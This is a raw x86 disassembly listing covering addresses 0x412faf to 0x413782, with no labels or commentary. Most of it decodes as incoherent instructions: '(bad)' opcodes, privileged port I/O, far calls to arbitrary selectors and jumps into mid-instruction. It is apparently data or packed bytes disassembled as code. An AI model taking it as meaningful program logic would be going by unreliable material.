  412faf:	mov    ebp,0xa0251e29
  412fb4:	sub    ah,BYTE PTR [eax+0x8]
  412fb7:	test   BYTE PTR [ebx-0x1],al
  412fba:	retf   0xc940
  412fbd:	sub    ecx,esi
  412fbf:	scas   al,BYTE PTR es:[edi]
  412fc0:	sub    eax,0xfc3b1592
  412fc5:	adc    bh,BYTE PTR fs:[ecx]
  412fc8:	mov    dl,0x32
  412fca:	mov    al,0x55
  412fcc:	inc    edx
  412fcd:	mov    fs,WORD PTR [edx-0x10]
  412fd0:	je     0x41300c
  412fd2:	(bad)
  412fd5:	std    
  412fd6:	dec    esp
  412fd7:	hlt    
  412fd8:	pop    ss
  412fd9:	cmp    ah,dh
  412fdb:	ins    BYTE PTR es:[edi],dx
  412fdc:	imul   edx,esp,0xca840de0
  412fe2:	mov    dl,0xa4
  412fe4:	js     0x412fb6
  412fe6:	data16 loope 0x413009
  412fe9:	jg     0x412f85
  412feb:	and    BYTE PTR [ecx],dl
  412fed:	out    0xdd,al
  412fef:	or     BYTE PTR [edx+0x2c],cl
  412ff2:	inc    edx
  412ff3:	push   eax
  412ff4:	sar    BYTE PTR [edi],1
  412ff6:	cs lahf 
  412ff8:	loop   0x41300d
  412ffa:	lds    esi,FWORD PTR [eax-0x6cc6cd62]
  413000:	add    DWORD PTR [ebp-0x7ecbe851],ebx
  413006:	pusha  
  413007:	out    0xd,al
  413009:	mov    al,0x4c
  41300b:	xor    ch,ah
  41300d:	sub    BYTE PTR [edx],ch
  41300f:	and    BYTE PTR [ebp-0x457efd59],dl
  413015:	mov    cs,WORD PTR [ecx-0x3ef34c53]
  41301b:	in     eax,dx
  41301c:	sbb    ebp,edi
  41301e:	fchs   
  413020:	xchg   edi,eax
  413021:	loopne 0x413032
  413023:	adc    eax,0x34181ff6
  413028:	(bad)  
  413029:	jle    0x413012
  41302b:	push   ds
  41302c:	aas    
  41302d:	xor    eax,0x25e5f084
  413032:	shl    BYTE PTR [ecx+0xc8176b],1
  413038:	call   0xaac7:0x1a6234b9
  41303f:	imul   esp,DWORD PTR [ebp+0x4a],0x28de5d7b
  413046:	push   0xfffffff8
  413048:	loop   0x413087
  41304a:	into   
  41304b:	cmp    DWORD PTR [edi+0x4ccda3ee],ecx
  413051:	or     edx,DWORD PTR [ecx]
  413053:	in     eax,dx
  413054:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  413056:	clc    
  413057:	test   eax,0x6e65e6cf
  41305c:	sbb    dl,BYTE PTR [ebx+ebx*1+0x62cac094]
  413063:	jl     0x4130df
  413065:	test   BYTE PTR [eax-0x26],al
  413068:	and    al,0x99
  41306a:	push   0xfffffffd
  41306c:	adc    al,0xbc
  41306e:	and    eax,0x1c130c4c
  413073:	push   cs
  413074:	ret    
  413075:	scas   al,BYTE PTR es:[edi]
  413076:	leave  
  413077:	test   DWORD PTR [esp+edx*1-0x70afc1b9],esp
  41307e:	out    dx,eax
  41307f:	inc    ecx
  413080:	add    al,0x52
  413082:	bound  edi,QWORD PTR [ebp+0x61103a29]
  413088:	xor    DWORD PTR [eax-0x65fe721b],ecx
  41308e:	mov    gs,WORD PTR [edi]
  413090:	sbb    bh,BYTE PTR [edx+0x69]
  413093:	mov    eax,ds:0xc29d591f
  413098:	sbb    al,0x17
  41309a:	xor    al,0x85
  41309c:	cdq    
  41309d:	push   ebx
  41309e:	mov    WORD PTR [edi+0x68],ss
  4130a1:	fsubr  QWORD PTR [ebp-0x5b6a3f3c]
  4130a7:	lahf   
  4130a8:	retf   0x8f33
  4130ab:	push   eax
  4130ac:	xor    eax,0x4bf8be22
  4130b1:	je     0x413131
  4130b3:	arpl   WORD PTR [edi-0x76],cx
  4130b6:	fcom   DWORD PTR [ebp+0x49315681]
  4130bc:	fisubr DWORD PTR [edx+0x7e1d15b1]
  4130c2:	repz xor ebp,edx
  4130c5:	mov    ch,0xfe
  4130c7:	pop    ss
  4130c8:	imul   edx,DWORD PTR [eax+eax*1+0x11d6b2de],0x46
  4130d0:	mov    ebx,0x1513f62c
  4130d5:	push   es
  4130d6:	mov    dh,0x3a
  4130d8:	ds (bad) 
  4130db:	ror    BYTE PTR [edi-0x14e98a27],1
  4130e1:	add    BYTE PTR [eax-0x7ce84f20],ah
  4130e7:	icebp  
  4130e8:	mov    bh,0x41
  4130ea:	hlt    
  4130eb:	jno    0x4130a9
  4130ed:	jp     0x4130cc
  4130ef:	call   0xc4d1:0xda6454ef
  4130f6:	jns    0x4130a7
  4130f8:	loope  0x4130a7
  4130fa:	sub    DWORD PTR [edx],eax
  4130fc:	push   edx
  4130fd:	cs aas 
  4130ff:	pop    esi
  413100:	xor    BYTE PTR [esi],0xeb
  413103:	lea    edx,[esi]
  413105:	aaa    
  413106:	xchg   edx,ebp
  413108:	adc    BYTE PTR [ecx+0x46],0x58
  41310c:	ret    
  41310d:	xchg   edi,eax
  41310e:	in     al,dx
  41310f:	jl     0x4130d7
  413111:	shl    BYTE PTR [ebp+0x22],cl
  413114:	sahf   
  413115:	shl    BYTE PTR fs:[ecx+0x14],0xec
  41311a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41311b:	jmp    0x413108
  41311d:	or     BYTE PTR [esi-0x8b205e1],0xee
  413124:	ins    DWORD PTR es:[edi],dx
  413125:	in     eax,0xaa
  413127:	scas   al,BYTE PTR es:[edi]
  413128:	cdq    
  413129:	scas   eax,DWORD PTR es:[edi]
  41312a:	add    DWORD PTR [ebx-0xe],ebx
  41312d:	pushf  
  41312e:	test   eax,0xe1fd662d
  413133:	jge    0x4130f3
  413135:	push   es
  413136:	push   esi
  413137:	scas   eax,DWORD PTR es:[edi]
  413138:	add    ecx,DWORD PTR [esi]
  41313a:	fldcw  WORD PTR [edx]
  41313c:	out    dx,eax
  41313d:	inc    ebx
  41313e:	(bad)  
  41313f:	sti    
  413140:	jb     0x4130c9
  413142:	sbb    cl,cl
  413144:	inc    ebx
  413145:	push   ebp
  413146:	push   ebx
  413147:	neg    bl
  413149:	push   ds
  41314a:	ins    BYTE PTR es:[edi],dx
  41314b:	mov    esp,DWORD PTR [ecx+edx*8]
  41314e:	ins    DWORD PTR es:[di],dx
  413150:	mov    dl,0xaf
  413152:	inc    edi
  413153:	and    BYTE PTR ds:0x7d67728c,al
  413159:	pop    ss
  41315a:	xchg   ebx,eax
  41315b:	jo     0x4131b7
  41315d:	push   ds
  41315e:	es clc 
  413160:	add    ebx,DWORD PTR [ecx+ebp*2+0x51]
  413164:	mov    ?,WORD PTR [edx-0x2d42cda5]
  41316a:	aas    
  41316b:	xchg   edx,eax
  41316c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41316d:	xchg   esp,eax
  41316e:	in     eax,0xd3
  413170:	fld    QWORD PTR [ebp-0x1ff85628]
  413176:	mov    al,0x2e
  413178:	in     al,dx
  413179:	inc    BYTE PTR [ebp-0x7c]
  41317c:	lds    esp,FWORD PTR [ecx-0x41dc1e09]
  413182:	and    eax,0x75d2b481
  413187:	and    dl,0x46
  41318a:	mov    ds:0xe774cde5,eax
  41318f:	add    eax,DWORD PTR [ecx-0x6a679b4d]
  413195:	fild   WORD PTR [edx+0x34]
  413198:	jae    0x413128
  41319a:	jg     0x4131fe
  41319c:	or     BYTE PTR [edx+0x4a],bl
  41319f:	or     esi,0x63
  4131a2:	jno    0x413125
  4131a4:	lds    esp,FWORD PTR [edx+0x4e]
  4131a7:	cmp    edi,DWORD PTR [esp+edx*1]
  4131aa:	push   esp
  4131ab:	fwait
  4131ac:	adc    esp,eax
  4131ae:	call   0x8bde:0x756199cb
  4131b5:	gs or  al,0x32
  4131b9:	mov    bh,0xa7
  4131bb:	loop   0x41314f
  4131bd:	mov    DWORD PTR [edx+0x576acffc],0x24030cf1
  4131c7:	and    edi,edx
  4131c9:	sub    BYTE PTR [eax-0x2e4eb383],al
  4131cf:	das    
  4131d0:	jb     0x413237
  4131d2:	call   0x6158:0xf0bdacd6
  4131d9:	in     al,dx
  4131da:	push   ecx
  4131db:	push   ss
  4131dc:	dec    ebp
  4131dd:	ins    DWORD PTR es:[edi],dx
  4131de:	and    esi,DWORD PTR [eax+edx*4]
  4131e1:	mov    al,0xbe
  4131e3:	inc    ebp
  4131e4:	cwde   
  4131e5:	sub    ah,BYTE PTR ds:0x71296ac
  4131eb:	pushf  
  4131ec:	shl    al,0xf9
  4131ef:	loop   0x41324f
  4131f1:	dec    ecx
  4131f2:	xor    BYTE PTR [eax+0x4b],cl
  4131f5:	pop    dx
  4131f7:	(bad)  [ecx-0x2ea000f0]
  4131fd:	jmp    0xf8df36e1
  413202:	dec    edi
  413203:	mov    ds:0x3b499092,ax
  413209:	mov    esi,0xcae50176
  41320e:	fild   DWORD PTR [edx]
  413210:	push   esp
  413211:	xor    ebp,DWORD PTR [esi]
  413213:	mov    ebp,0x3d2b5d6f
  413218:	mov    eax,ds
  41321a:	popf   
  41321b:	lds    esp,FWORD PTR [edx+0x4e]
  41321e:	push   ecx
  41321f:	adc    al,BYTE PTR [edx-0x34]
  413222:	mov    BYTE PTR [ebp-0x63],dh
  413225:	clc    
  413226:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413227:	mov    ah,0x33
  413229:	cmp    eax,0x955ddebd
  41322e:	pop    edx
  41322f:	dec    ebx
  413230:	loop   0x413256
  413232:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413233:	aad    0x3
  413235:	(bad)  
  413236:	xchg   edi,eax
  413237:	jl     0x41326d
  413239:	push   edx
  41323a:	arpl   WORD PTR [esi+ebx*4-0xf70672c],ax
  413241:	and    edi,DWORD PTR [ebp+0x52]
  413244:	and    eax,0x9b7d46df
  413249:	jnp    0x4131eb
  41324b:	mov    eax,ds:0x3946713d
  413250:	sar    DWORD PTR [edx-0x4f74ba8b],1
  413256:	imul   ebp,DWORD PTR [edi-0x4b],0xffffffb1
  41325a:	arpl   WORD PTR [esi+0x21],di
  41325d:	daa    
  41325e:	sub    al,0x85
  413260:	shr    bh,cl
  413262:	ss push ebx
  413264:	mov    al,ds:0x92171c61
  413269:	adc    ch,BYTE PTR [edx]
  41326b:	xchg   edi,eax
  41326c:	adc    al,0x20
  41326e:	sub    dh,BYTE PTR [esi]
  413270:	bound  esp,QWORD PTR [ebx-0x72]
  413273:	add    DWORD PTR [ebp+edx*8-0x55],eax
  413277:	sbb    dh,BYTE PTR [esi]
  413279:	inc    ebx
  41327a:	leave  
  41327b:	aaa    
  41327c:	fiadd  DWORD PTR [eax-0x76]
  41327f:	ja     0x41320b
  413281:	iret   
  413282:	sbb    bh,BYTE PTR [eax+0x74]
  413285:	mov    eax,0x2a604d3d
  41328a:	pop    esi
  41328b:	retf   
  41328c:	inc    eax
  41328d:	inc    ebp
  41328e:	(bad)  
  41328f:	push   edi
  413290:	jecxz  0x41328c
  413292:	out    dx,al
  413293:	push   esi
  413294:	jl     0x413238
  413296:	xchg   esi,eax
  413297:	ficomp DWORD PTR [ecx]
  413299:	sub    BYTE PTR [edx-0x3],ch
  41329c:	push   ecx
  41329d:	xchg   DWORD PTR [ecx],edi
  41329f:	push   esi
  4132a0:	add    WORD PTR [edi],bx
  4132a3:	pushf  
  4132a4:	stos   BYTE PTR es:[edi],al
  4132a5:	mov    ebx,0xa9161153
  4132aa:	mov    ebp,0xcdf4adbb
  4132af:	rol    DWORD PTR [edx],cl
  4132b1:	mov    esp,0xd80986e3
  4132b6:	les    eax,FWORD PTR [esi]
  4132b8:	dec    ebp
  4132b9:	sbb    DWORD PTR [ecx],ebx
  4132bb:	pop    esp
  4132bc:	or     BYTE PTR [edi],bh
  4132be:	sbb    BYTE PTR ds:0xebb88282,dh
  4132c4:	adc    cl,ah
  4132c6:	fldenv [ebx]
  4132c8:	repz sti 
  4132ca:	pop    ebx
  4132cb:	adc    eax,0xac524c27
  4132d0:	ret    0x980f
  4132d3:	pushf  
  4132d4:	stos   DWORD PTR es:[edi],eax
  4132d5:	fmul   DWORD PTR [ecx+ecx*8]
  4132d8:	js     0x41334e
  4132da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4132db:	ror    BYTE PTR [edx+edx*1],1
  4132de:	cmp    bl,BYTE PTR ss:[ebx-0x4e]
  4132e2:	jo     0x413307
  4132e4:	xchg   edi,eax
  4132e5:	jecxz  0x4132fa
  4132e7:	out    0xd6,al
  4132e9:	aaa    
  4132ea:	xor    ch,bh
  4132ec:	add    BYTE PTR [ecx-0x5a],al
  4132ef:	adc    bh,ch
  4132f1:	retf   0xef2e
  4132f4:	jns    0x413295
  4132f6:	in     al,0xe
  4132f8:	mov    DWORD PTR [ecx],edi
  4132fa:	mov    edx,0x52c0b446
  4132ff:	call   0x551a:0x4270eed0
  413306:	dec    esi
  413307:	inc    ebx
  413308:	in     al,dx
  413309:	mov    ds:0x65476139,al
  41330e:	cwde   
  41330f:	adc    BYTE PTR [ebp-0x70],ah
  413312:	and    BYTE PTR [eax],0xf7
  413315:	scas   al,BYTE PTR es:[edi]
  413316:	sbb    al,0x53
  413318:	sub    esp,esp
  41331a:	dec    ebx
  41331b:	or     BYTE PTR [edx-0x75],0x60
  41331f:	push   esp
  413320:	mov    cl,cl
  413322:	sub    BYTE PTR [esi-0x49],dl
  413325:	(bad)  
  413326:	jo     0x4132b0
  413328:	xchg   ecx,eax
  413329:	jno    0x4132de
  41332b:	or     esp,edx
  41332d:	out    0x59,eax
  41332f:	add    al,0xed
  413331:	or     ecx,DWORD PTR [edx-0x16694365]
  413337:	ud2    
  413339:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41333a:	outs   dx,BYTE PTR ds:[esi]
  41333b:	aam    0xc0
  41333d:	mov    cl,0xd1
  41333f:	and    BYTE PTR [ecx+0x7fd19d79],bl
  413345:	enter  0xfa55,0x79
  413349:	jecxz  0x413312
  41334b:	xchg   edx,eax
  41334c:	jmp    0x2b4e:0xe907f21b
  413353:	data16 cmp ch,BYTE PTR [ebp-0xa5dafd4]
  41335a:	jmp    0x4133a7
  41335c:	push   0xe611abcd
  413361:	mov    ah,0x10
  413363:	call   ecx
  413365:	ins    DWORD PTR es:[edi],dx
  413366:	out    0x1a,eax
  413368:	stos   DWORD PTR es:[edi],eax
  413369:	popf   
  41336a:	test   eax,0x65615dd5
  41336f:	jnp    0x4133b5
  413371:	xor    eax,0xde4f485a
  413376:	or     al,BYTE PTR [edi+0x46]
  413379:	mov    ch,0x3b
  41337b:	adc    edi,edi
  41337d:	in     eax,0x1c
  41337f:	ds (bad) 
  413381:	jmp    0xeeba3887
  413386:	pop    ss
  413387:	scas   eax,DWORD PTR es:[edi]
  413388:	js     0x413336
  41338a:	retf   0xc345
  41338d:	xor    ebx,ecx
  41338f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413390:	out    0x3,al
  413392:	call   0x2069:0x12aa1f9f
  413399:	mov    bl,0xc4
  41339b:	outs   dx,BYTE PTR ds:[esi]
  41339c:	rcr    DWORD PTR [ebx],0x21
  41339f:	call   0x3cc4cc46
  4133a4:	adc    cl,BYTE PTR [eax]
  4133a6:	xchg   ebx,eax
  4133a7:	repz jp 0x41337c
  4133aa:	add    eax,0xec57039f
  4133af:	std    
  4133b0:	imul   edi,ecx,0xfffffffe
  4133b3:	mov    edi,0x45686d88
  4133b8:	add    BYTE PTR [ebx+0x7d06bdb2],dl
  4133be:	stos   BYTE PTR es:[di],al
  4133c0:	add    BYTE PTR [edi],bl
  4133c2:	lock jmp 0x41337d
  4133c5:	xchg   edx,eax
  4133c6:	push   es
  4133c7:	jmp    0x41340d
  4133c9:	mov    eax,0x49fa749d
  4133ce:	inc    edi
  4133cf:	into   
  4133d0:	push   0xade6235e
  4133d5:	mov    ah,0x4e
  4133d7:	xor    BYTE PTR [ebp+edx*1-0xf5a4016],dh
  4133de:	cmp    BYTE PTR [ecx],dh
  4133e0:	push   ebp
  4133e1:	dec    edx
  4133e2:	xor    BYTE PTR [eax],0x87
  4133e5:	rcr    DWORD PTR [edx-0x7b],cl
  4133e8:	cmp    BYTE PTR [esi-0x1e7ec6c5],0x8c
  4133ef:	xlat   BYTE PTR ds:[ebx]
  4133f0:	ret    
  4133f1:	pop    ebx
  4133f2:	lods   al,BYTE PTR ds:[esi]
  4133f3:	jmp    0x8c8a:0xeecf6218
  4133fa:	sub    cl,BYTE PTR [eax-0x9]
  4133fd:	cmp    ah,ch
  4133ff:	mov    bl,0x0
  413401:	cmp    ah,bh
  413403:	test   ah,cl
  413405:	addr16 enter 0x33ca,0x10
  41340a:	int3   
  41340b:	push   esi
  41340c:	dec    edx
  41340d:	inc    eax
  41340e:	rol    BYTE PTR [eax],0x76
  413411:	pop    ebx
  413412:	push   ebp
  413413:	and    bl,dl
  413415:	lods   eax,DWORD PTR ds:[esi]
  413416:	into   
  413417:	adc    BYTE PTR [edi+ecx*1-0x6ec0ece9],cl
  41341e:	sbb    BYTE PTR [ebx-0xf],cl
  413421:	xor    ebx,esp
  413423:	or     BYTE PTR [edx-0x7cdc69de],0x7d
  41342a:	in     eax,dx
  41342b:	mov    ebp,0xb4a49cd0
  413430:	pusha  
  413431:	push   0x37d642c3
  413436:	inc    eax
  413437:	cmp    DWORD PTR [ebp-0x6f],ebp
  41343a:	clc    
  41343b:	mul    BYTE PTR [edi]
  41343d:	jne    0x413410
  41343f:	sbb    DWORD PTR ds:0xb901c79f,edx
  413445:	sar    BYTE PTR [eax],cl
  413447:	and    dl,BYTE PTR [edx+0x7d76a06]
  41344d:	push   0xffffffb0
  41344f:	shr    DWORD PTR ds:0xccbb0a53,0x2
  413456:	idiv   BYTE PTR [ecx]
  413458:	and    DWORD PTR [edx+0x3ec3f09],esp
  41345e:	jecxz  0x4134a0
  413460:	sub    eax,0x5da32251
  413465:	into   
  413466:	fbld   TBYTE PTR [edi+edx*2-0xba4c300]
  41346d:	xchg   DWORD PTR [eax+ebp*4-0xa7b72d3],edx
  413474:	outs   dx,BYTE PTR ds:[esi]
  413475:	inc    eax
  413476:	inc    ebx
  413477:	popf   
  413478:	inc    edi
  413479:	sbb    BYTE PTR [eax],bh
  41347b:	push   edx
  41347c:	retf   
  41347d:	xor    al,0xe
  41347f:	cmp    bl,bl
  413481:	sub    DWORD PTR [ecx],esp
  413483:	mov    WORD PTR [ebx-0x747c354f],ds
  413489:	push   cs
  41348a:	stc    
  41348b:	ins    DWORD PTR es:[edi],dx
  41348c:	adc    BYTE PTR [esi+0x4b32a86a],bh
  413492:	mov    esi,0xee189745
  413497:	push   0x42a064bb
  41349c:	cs and al,0x3e
  41349f:	xchg   esp,eax
  4134a0:	icebp  
  4134a1:	or     bh,BYTE PTR ds:0xf9472634
  4134a7:	int    0xf6
  4134a9:	in     al,0x4a
  4134ab:	es sti 
  4134ad:	out    0x3e,al
  4134af:	mov    DWORD PTR [edx],ebx
  4134b1:	sub    cl,ch
  4134b3:	pop    esi
  4134b4:	je     0x4134d3
  4134b6:	test   DWORD PTR ds:0xae916f15,ebx
  4134bc:	into   
  4134bd:	data16 repz (bad) 
  4134c0:	sbb    BYTE PTR [edx-0x33],bl
  4134c3:	cli    
  4134c4:	mov    ecx,0x4890af7a
  4134c9:	nop
  4134ca:	pop    ebx
  4134cb:	mov    ebp,0xf9e5199a
  4134d0:	dec    ecx
  4134d1:	inc    edx
  4134d2:	cmp    BYTE PTR [ebx-0x1e],cl
  4134d5:	call   0x4df9c7b0
  4134da:	jmp    0x8525db49
  4134df:	xor    eax,0x6d5468a0
  4134e4:	fcomp  st(6)
  4134e6:	loope  0x413562
  4134e8:	mov    dh,0x61
  4134ea:	rcr    al,cl
  4134ec:	xor    DWORD PTR [edx-0xa],0xffffffc2
  4134f0:	sub    cl,al
  4134f2:	push   eax
  4134f3:	sbb    DWORD PTR [edx-0x66f6a971],esi
  4134f9:	loope  0x4134c9
  4134fb:	pop    edi
  4134fc:	loop   0x4134fa
  4134fe:	jns    0x413485
  413500:	jnp    0x413530
  413502:	and    al,cl
  413504:	and    eax,0xa09be458
  413509:	push   ds
  41350a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41350b:	aam    0xa0
  41350d:	xchg   esi,eax
  41350e:	pop    ss
  41350f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413510:	lock out dx,al
  413512:	test   DWORD PTR [edi-0x4a],0xf373dbab
  413519:	jmp    0x413599
  41351b:	bound  edi,QWORD PTR [eax+0x3b7379f0]
  413521:	push   esp
  413522:	test   BYTE PTR [ebx],dl
  413524:	and    dl,BYTE PTR [ebx+0x7db064cf]
  41352a:	in     eax,dx
  41352b:	scas   eax,DWORD PTR es:[edi]
  41352c:	sar    BYTE PTR [edi-0x7c788298],0xd3
  413533:	pop    esi
  413534:	inc    ebx
  413535:	mov    dl,0xf9
  413537:	scas   eax,DWORD PTR es:[edi]
  413538:	push   edi
  413539:	(bad)  [esi+0x11]
  41353c:	call   0x3feb:0xdc0d5e79
  413543:	lahf   
  413544:	in     al,dx
  413545:	and    BYTE PTR ds:0x48675d0,bl
  41354b:	xchg   esp,eax
  41354c:	pushf  
  41354d:	pop    edx
  41354e:	and    DWORD PTR [eax+0x10],0xffffffe2
  413552:	repz xchg ah,dl
  413555:	mov    esp,0x9c58f77b
  41355a:	add    eax,0x15
  41355d:	icebp  
  41355e:	xchg   DWORD PTR [eax-0x66],ebx
  413561:	loope  0x4135b5
  413563:	pusha  
  413564:	push   eax
  413565:	ss out dx,eax
  413567:	lds    eax,FWORD PTR [edi]
  413569:	icebp  
  41356a:	cmp    edi,DWORD PTR [edx]
  41356c:	mov    edi,0xd514c33a
  413571:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413572:	cld    
  413573:	sub    eax,0x61e7a447
  413578:	ret    
  413579:	jne    0x413595
  41357b:	xchg   ebx,eax
  41357c:	fst    st(2)
  41357e:	pop    edx
  41357f:	stos   DWORD PTR es:[edi],eax
  413580:	cld    
  413581:	in     al,0x80
  413583:	cmp    BYTE PTR [ebx-0x7a],ah
  413586:	push   ecx
  413587:	imul   edi,DWORD PTR [esi-0x1f],0x49
  41358b:	sbb    al,0x49
  41358d:	sbb    al,0xd0
  41358f:	or     al,0x98
  413591:	xchg   ecx,eax
  413592:	scas   al,BYTE PTR es:[edi]
  413593:	sbb    BYTE PTR [esi-0x4a],dl
  413596:	adc    edi,DWORD PTR [edi+eax*2-0x14]
  41359a:	(bad)  
  41359d:	retf   0x78a6
  4135a0:	pop    ecx
  4135a1:	sbb    eax,0xec35889c
  4135a6:	in     eax,dx
  4135a7:	cs inc ebx
  4135a9:	neg    ecx
  4135ab:	sbb    ebp,eax
  4135ad:	inc    edx
  4135ae:	retf   
  4135af:	stos   DWORD PTR es:[edi],eax
  4135b0:	mov    ds:0x8fc709c4,eax
  4135b5:	shr    esi,0x78
  4135b8:	stc    
  4135b9:	dec    esp
  4135bb:	mov    bl,0xc0
  4135bd:	(bad)  
  4135be:	rol    BYTE PTR es:[ecx+0x4fbe38cc],cl
  4135c5:	pop    esp
  4135c6:	mov    edx,0x322abbe7
  4135cb:	jbe    0x413589
  4135cd:	js     0x413597
  4135cf:	out    0x4,al
  4135d1:	pop    eax
  4135d2:	jmp    0x82a6:0x1524b4e2
  4135d9:	(bad)  
  4135da:	ficom  DWORD PTR [esp+eax*4]
  4135dd:	adc    eax,0x732cbbd6
  4135e2:	mov    fs,WORD PTR [edx-0x42]
  4135e5:	xchg   edi,eax
  4135e6:	push   esp
  4135e7:	call   0x94429ebf
  4135ec:	jno    0x413642
  4135ee:	xchg   edx,eax
  4135ef:	imul   ebx,DWORD PTR [ebx-0x1f],0x13e2f062
  4135f6:	ret    
  4135f7:	dec    ebx
  4135f8:	cmp    ah,dl
  4135fa:	mov    ebp,0x5d720bc0
  4135ff:	sbb    DWORD PTR [esi+0x72],0x1d
  413603:	push   ebp
  413604:	cdq    
  413605:	shl    BYTE PTR [edi],0x21
  413608:	in     eax,0x32
  41360a:	and    ah,dh
  41360c:	(bad)  
  41360d:	sbb    edx,DWORD PTR [eax+0x19]
  413610:	jbe    0x413640
  413612:	stos   DWORD PTR es:[edi],eax
  413613:	sbb    eax,0x80ffb660
  413618:	in     al,0x70
  41361a:	cmc    
  41361b:	add    eax,0x3726f4cd
  413620:	pop    ebp
  413621:	jno    0x4135c0
  413623:	cmp    BYTE PTR [esi],bl
  413625:	mov    BYTE PTR [ecx+0x67e245c4],cl
  41362b:	add    eax,0xe65c8c37
  413630:	xchg   edx,eax
  413631:	jne    0x413662
  413633:	xor    ah,BYTE PTR [esi-0x7fd57886]
  413639:	mov    ebp,0xbd35c1a7
  41363e:	xchg   BYTE PTR [edx+0x24816e9c],bh
  413644:	(bad)  
  413645:	push   0xffffffa5
  413647:	inc    ebp
  413648:	mov    ecx,0x344f3d3a
  41364d:	fistp  WORD PTR [esi-0x6d]
  413650:	ds (bad) 
  413652:	cld    
  413653:	out    0xc1,al
  413655:	cli    
  413656:	cmp    eax,0x8b1ba123
  41365b:	push   esp
  41365c:	add    BYTE PTR [edi-0x74],0x15
  413660:	imul   BYTE PTR [ebx]
  413662:	clc    
  413663:	pop    ebx
  413664:	loop   0x4136c5
  413666:	sbb    al,0x4a
  413668:	icebp  
  413669:	sub    esi,eax
  41366b:	outs   dx,DWORD PTR ds:[esi]
  41366c:	inc    esi
  41366d:	or     al,0x8d
  41366f:	mov    ecx,0x44989149
  413674:	hlt    
  413675:	jp     0x41365b
  413677:	push   edx
  413678:	push   0xffffff9e
  41367a:	jge    0x41366a
  41367c:	ins    DWORD PTR es:[edi],dx
  41367d:	not    esi
  41367f:	xchg   esi,eax
  413680:	jno    0x4136df
  413682:	mov    dl,0xfe
  413684:	pop    ds
  413685:	(bad)  
  413686:	xchg   esi,eax
  413687:	out    dx,al
  413688:	or     ebx,DWORD PTR [eax+ecx*1]
  41368b:	pop    edx
  41368c:	cmc    
  41368d:	pop    esp
  41368e:	mov    ds:0xc8207509,al
  413693:	push   ebx
  413694:	jle    0x41363e
  413696:	sahf   
  413697:	std    
  413698:	call   0x9d894ba1
  41369d:	push   eax
  41369e:	sbb    cl,BYTE PTR [ecx+0x26]
  4136a1:	outs   dx,DWORD PTR ds:[esi]
  4136a2:	add    DWORD PTR [ebx+eax*1],ebp
  4136a5:	lea    eax,[edx]
  4136a7:	and    cl,BYTE PTR [ecx-0x5d]
  4136aa:	push   esp
  4136ab:	xchg   ecx,eax
  4136ac:	add    DWORD PTR [ecx],eax
  4136ae:	das    
  4136af:	inc    esi
  4136b0:	sbb    eax,0x1bf8a057
  4136b5:	mov    ecx,esp
  4136b7:	jno    0x413726
  4136b9:	cmp    eax,0x72f67ef2
  4136be:	les    ebx,FWORD PTR [ebp+0x2dcf047b]
  4136c4:	jo     0x413731
  4136c6:	mov    BYTE PTR [ebx-0x48b1e337],dh
  4136cc:	scas   al,BYTE PTR es:[edi]
  4136cd:	(bad)  
  4136cf:	test   BYTE PTR [esi-0x45],ch
  4136d2:	pop    ebp
  4136d3:	mov    eax,ds:0x1e388380
  4136d8:	mov    bl,0xa1
  4136da:	add    DWORD PTR [edx-0x3],ebp
  4136dd:	(bad)  
  4136de:	xor    dh,ah
  4136e0:	fadd   st,st(7)
  4136e2:	out    0xd8,eax
  4136e4:	cwde   
  4136e5:	ret    0xcf34
  4136e8:	in     al,dx
  4136e9:	(bad)  
  4136ea:	jmp    0x2c5e:0xd3f7229c
  4136f1:	xchg   ebp,eax
  4136f2:	mov    dh,0xf8
  4136f4:	cld    
  4136f5:	pop    edx
  4136f6:	push   esi
  4136f7:	cmc    
  4136f8:	pop    esp
  4136f9:	(bad)
  4136fc:	sbb    BYTE PTR [ecx+0x268c0476],ah
  413702:	in     eax,0xf8
  413704:	mov    al,0x41
  413706:	je     0x41375b
  413708:	fist   WORD PTR [ecx]
  41370a:	fsubr  QWORD PTR [ebx]
  41370c:	xor    eax,0x8f109efb
  413711:	(bad)  
  413712:	pop    ds
  413713:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413714:	sub    DWORD PTR [esi-0x33e39252],0x57
  41371b:	popa   
  41371c:	and    DWORD PTR [eax],esp
  41371e:	and    DWORD PTR [ecx],ebx
  413720:	xchg   edx,eax
  413721:	pop    esp
  413722:	pop    ss
  413723:	mov    ds:0xc48c566,al
  413728:	lods   al,BYTE PTR ds:[esi]
  413729:	mov    ds:0xc3e812e9,eax
  41372e:	imul   esi,DWORD PTR [ebx-0x2f5a5e94],0x45
  413735:	dec    esp
  413736:	xor    DWORD PTR [ecx],eax
  413738:	(bad)  
  41373a:	add    al,0xa2
  41373c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41373d:	push   ebx
  41373e:	leave  
  41373f:	cmpxchg DWORD PTR [edx],eax
  413742:	(bad)  
  413743:	loop   0x413760
  413745:	dec    ebx
  413746:	pop    eax
  413747:	mov    ebp,0xcb421407
  41374c:	mov    esp,0x79286742
  413751:	(bad)  
  413752:	push   ds
  413753:	lds    esp,FWORD PTR [ecx-0x6a]
  413756:	ja     0x41373c
  413758:	in     al,0xac
  41375a:	sar    DWORD PTR [edx],1
  41375c:	inc    esp
  41375d:	xor    al,0x20
  41375f:	rcl    BYTE PTR [ecx-0x2c],1
  413762:	xchg   edi,eax
  413763:	add    WORD PTR [esi+ebx*1-0x67],bp
  413768:	jp     0x413771
  41376a:	jecxz  0x4136ef
  41376c:	dec    esi
  41376d:	dec    ebp
  41376e:	in     eax,dx
  41376f:	xor    edx,DWORD PTR [edi+0x7a58bed4]
  413775:	rcl    BYTE PTR [ebx+0x3],0xf2
  413779:	pop    ebp
  41377a:	add    al,0x41
  41377c:	add    edi,DWORD PTR [eax+0x30]
  41377f:	retf   0x123e
  413782:	inc    ebx
